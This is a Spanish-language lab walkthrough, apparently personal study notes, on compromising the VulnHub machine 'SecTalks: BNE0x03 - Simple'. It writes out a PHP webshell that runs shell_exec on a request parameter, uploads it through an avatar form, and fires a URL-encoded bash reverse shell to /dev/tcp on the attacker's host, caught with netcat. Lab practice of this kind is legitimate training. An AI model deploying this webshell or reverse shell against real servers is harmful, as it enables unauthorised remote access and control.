# Obtener Intrusión a Servidor Mediante uso de una Webshell

Maquinas a utilizar **Kali Linux y SecTalks: BNE0x03 - Simple (**[https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141))

Seguimos con la subida de archivos malicioso para obtener intrusión remota de la maquina pero vamos a aprender el concepto de una Webshell.

```bash
sudo arp-scan -I eth0 --localne
```

```bash
ping -c 1 10.0.3.13
```

![image.png](./imagenes/image%2060.png)

```bash
nmap -p- -sS -sV -sC -min-rate 5000 -n -vvv -Pn 10.0.3.13
```

![image.png](./imagenes/image%2061.png)

- Introducimos su IP en el navegador web
    
    ![image.png](./imagenes/image%2062.png)
    
- Nos creamos un usuario
    
    ![image.png](./imagenes/image%2063.png)
    
    ![image.png](./imagenes/image%2064.png)
    
    ![image.png](./imagenes/image%2065.png)
    

Ya habíamos visto anterior mente como crear con msfvenom un archivo malicioso el cual subíamos y obteníamos control remoto. Pero que pasa si esto falla , pues vamos a ver una alternativa.

- Desde un terminal creamos un archivo webshell.php con nano.
    
    ```bash
    nano webshell.php
    ```
    
    Y escribimos dentro el siguiente codigo:
    
    ```bash
    <?php
            echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    ?>
    ```
    
    Este código PHP ejecuta un comando de shell que se recibe como parámetro a través de la solicitud HTTP ($_REQUEST['cmd']) y muestra el resultado en formato HTML dentro de una etiqueta .
    
- Subimos el archivo mediante el formulario.
- Acedemos al directorio **uploads** (Ya habíamos visto anterior mente como encontrábamos este directorio. **[Mirar Aquí](./imagenes/Explotacio%CC%81n%20de%20vulnerabilidad%20File%20Upload%201d5b1eeb5dd980499025e7d1a3364135.md)**)
    
    ![image.png](./imagenes/image%2066.png)
    

- Pulsamos sobre el archivo malicioso
    
    La pantalla se queda en blanco y parece que no funciona , pero en realidad si funciona. pero abría que pasarle los comandos a través de la URL algo que no es nada cómodo. Pero vamos a ver coso se hace por URL.
    
- Esta seria la URL que me aparece en mi caso con mi archivo malicioso. `http://10.0.3.13/uploads/avatar_Terra_webshell.php`
- Le añadimos al final de la URL
    
    `?cmd=whoami`
    
    Donde se repetirá siempre `?cmd=` y el resto será el comando que queremos ejecutar. Quedando de esta manera.
    
    `http://10.0.3.13/uploads/avatar_Terra_webshell.php?cmd=whoami`
    
    ![image.png](./imagenes/image%2067.png)
    
- Como hemos dicho antes este no es un método cómodo para ser utilizado. Y lo que estamos obteniendo es ejecución remota de comandos y lo que nosotros queremos  obtener intrusión a la maquina , debemos insertar el comando propio de la revershell pero URLcodeado ya que estamos utilizando el navegador.
- Nos vamos a [Online - Reverse Shell Generator](./imagenes/https://www.revshells.com/) y copiamos el comando típico de revershell.
    
    ![image.png](./imagenes/image%2068.png)
    
- Vamos a ello. Abrimos la **herramienta Burpsuite** y nos vamos a la pestaña **Decoder.**
    
    ![image.png](./imagenes/image%2069.png)
    

- Escribimos en el Burpsuite lo siguiente:
    
    `bash -c “**sh** -i >& /dev/tcp/**10.0.3.4**/**443** 0>&1”`
    
    ![image.png](./imagenes/image%2070.png)
    

- En el menú lateral derecho escogemos en la opción **Encode as... URL.**
    
    ![image.png](./imagenes/image%2071.png)
    
    Ya tenemos el comando URLcodeado.
    
    ![image.png](./imagenes/image%2072.png)
    

- Abrimos un terminal y hacemos un netcat al puerto 443 que es el que hemos puesto en el revershell.
    
    ![image.png](./imagenes/image%2073.png)
    

- Copiamos el comando URLcodeado, nos vamos al navegador y donde ponemos el comando copiamos el comando URLcodeado y ya estaremos dentro de la maquina.
    
    ![image.png](./imagenes/image%2074.png)
    
    ![image.png](./imagenes/image%2075.png)
    

A diferencia de lo que ocurría con una conexión con msfvenom aquí la conexión es mas estable y no se pierde.